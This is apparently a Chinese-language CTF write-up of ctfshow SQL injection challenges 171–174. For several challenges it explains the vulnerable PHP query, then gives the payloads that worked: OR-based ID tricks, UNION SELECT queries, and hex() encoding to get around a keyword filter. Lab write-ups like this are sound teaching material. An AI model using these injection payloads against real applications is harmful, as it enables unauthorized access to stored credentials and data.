#### 171

题目提示：

```
//拼接sql语句查找指定ID用户
$sql = "select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;";
```

`$_GET['id']` 是从用户的 GET 请求中获取的值，未进行过滤，知道注入点为id处。

复制语句到navicat中创建的本地数据库中尝试，语句改为

```
select username,password from user where username !='flag' and id = '1' or id = '3' limit 1;
```

显示了id = 1的内容

若改成

```
select username,password from user where username !='flag' and id = '888' or id = '3' limit 1;
```

则会显示id = 3的内容（or语句）。

题目中id只有24行，猜测flag是否在第25行未显示

于是可以在题目id处输入 `999' or id = '25`未显示flag

输入`999 'or id = '26`得到flag



#### 172

本题与上一题类似，但题目显示

```
//检查结果是否有flag
    if($row->username!=='flag'){
      $ret['msg']='查询成功';
    }
```

表示如果 `$row` (**查询内容**）对象中的 `username` 属性的值不等于 `'flag'` ，就将 `$ret` 数组中的 `'msg'` 键对应的值设置为 `'查询成功'`

则查询内容中，应只查询password而不查询username。此处引入**联合查询**（就是union语句）。

id查询处输入

```
999' union select id,password from ctfshow_user2 where username = 'flag
```

即可。



#### 173

本题题目显示

```
//检查结果是否有flag
    if(!preg_match('/flag/i', json_encode($ret))){
      $ret['msg']='查询成功';
    }
```

这段代码使用 `preg_match` 函数在 `json_encode($ret)` （**返回值**)的结果中搜索 `'flag'` （不区分大小写）。

如果没有匹配到，就设置 `$ret['msg'] = '查询成功'`

此处可以使用`hex()`函数对username进行转换,将其转化为16进制（也可以使用to_base64()函数将其转化为base64编码）

在id查询处输入

```
999' union select id,hex(username),password from ctfshow_user3 where username = 'flag
```

即可得到flag



#### 174

本题有点像特意出的考点

返回逻辑是

```
//检查结果是否有flag
    if(!preg_match('/flag|[0-9]/i', json_encode($ret))){
      $ret['msg']='查询成功';
    }
```

这段代码的作用是：如果经过 `json_encode` 编码后的 `$ret` 中不包含 `'flag'` （不区分大小写）以及任何数字（0 到 9），就将 `$ret` 数组中的 `'msg'` 键对应的值设置为 `'查询成功'` 。